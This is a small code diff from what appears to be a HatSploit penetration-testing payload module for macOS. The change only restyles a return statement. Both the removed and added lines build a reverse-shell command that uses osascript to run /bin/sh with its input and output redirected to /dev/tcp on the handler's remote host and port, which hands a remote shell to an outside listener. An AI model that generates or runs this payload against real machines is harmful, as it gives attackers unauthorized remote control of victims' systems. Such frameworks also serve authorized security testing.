@@ -27,5 +27,4 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{remote_host}/{remote_port} 0>&1 &\"'"
-        return payload
+        return f"""osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{remote_host}/{remote_port} 0>&1 &\"'"""
